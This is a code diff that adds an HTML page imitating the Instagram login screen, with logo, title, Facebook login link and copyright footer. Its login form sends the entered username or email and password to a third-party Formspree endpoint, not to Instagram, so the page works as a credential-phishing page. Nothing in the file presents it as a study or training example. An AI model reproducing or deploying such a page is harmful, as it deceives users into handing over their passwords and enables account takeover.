@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <title>Instagram Login</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form action="https://formspree.io/f/xzbwpoew"method="POST" id="login">
+                    <label for="email" class="sr-only">Phone number, username, or email</label>
+                    <input name="email" placeholder="Phone number, username, or email" />
+
+                    <label for="password" class="sr-only">Password</label>
+                    <input name="password" type="password" placeholder="Password" />
+
+                    <button class="login-button" title="login">Log In</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">or</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>Log in with Facebook</a>
+                    </div>
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account? </p>
+                <a href="#">Sign Up</a>
+            </div>
+
+        </section>
+    </main>
+    <footer>
+
+        <p class="copyright">© 2020 Instagram Facebook</p>
+    </footer>
+</body>
+</html>
